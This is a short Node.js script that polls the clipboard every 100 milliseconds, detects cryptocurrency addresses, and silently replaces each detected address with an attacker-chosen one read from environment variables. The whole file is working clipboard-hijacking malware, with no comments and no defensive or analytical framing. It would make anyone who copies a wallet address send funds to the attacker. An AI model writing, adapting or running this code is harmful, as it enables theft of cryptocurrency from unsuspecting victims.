const ClipboardListener = require('clipboard-listener');
const addressDetector = require('cryptocurrency-address-detector');
const dotenv = require('dotenv');
const ncp = require('copy-paste');

dotenv.config();

const listener = new ClipboardListener({
  timeInterval: 100,
  immediate: true,
});

listener.on('change', async value => {
  const detection = await addressDetector(value);

  if (detection !== 'Cryptocurrency could not be detected') {
    const cryptocurrency = detection === 'BTC/BCH' ? 'BTC' : detection;
    const replacementAddress = process.env[cryptocurrency];

    if (replacementAddress) {
      ncp.copy(replacementAddress);
    }
  }
});
